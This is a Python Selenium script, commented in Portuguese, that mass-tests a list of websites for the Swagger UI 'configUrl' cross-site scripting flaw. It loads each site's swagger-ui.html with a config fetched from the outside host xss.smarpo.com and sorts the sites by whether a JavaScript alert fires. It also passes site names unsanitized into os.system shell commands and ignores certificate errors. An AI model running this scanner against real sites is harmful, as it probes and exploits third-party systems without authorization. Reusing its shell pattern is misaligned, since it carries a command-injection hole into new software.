from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert
import time
from selenium.webdriver.chrome.options import Options
import os

chromeoptions = Options()
chromeoptions.add_argument('ignore-ssl-erros=yes')
chromeoptions.add_argument('ignore-certificate-errors')

driver = webdriver.Chrome(options=chromeoptions)



nome_arquivo = 'sites_para_testar.txt' 
with open(nome_arquivo, 'r') as arquivo:
    for site in arquivo:
        try:

            if site.endswith("/"):
                site = site[:-1]  # Removendo o Ãºltimo caractere
            print(site)
            site_completo = f"{site}/swagger-ui.html?configUrl=https://xss.smarpo.com/test.json"
            driver.get(site_completo)

            try:
                alert = Alert(driver)
                time.sleep(15)
                alert_text = alert.text
                expected_text = "textarea"

                if expected_text in alert_text:
                    print("Alerta encontrando com o texto: ", alert_text)
                    os.system(f"echo '{site_completo}' >> valido.txt")
                else:
                    os.system(f"echo '{site_completo}' >> talvezvalido.txt")

            except:
                os.system(f"echo '{site_completo}' >> naovalido.txt")

                print("Nenhum alerta encontrado.")
        except:
            pass


        
driver.quit()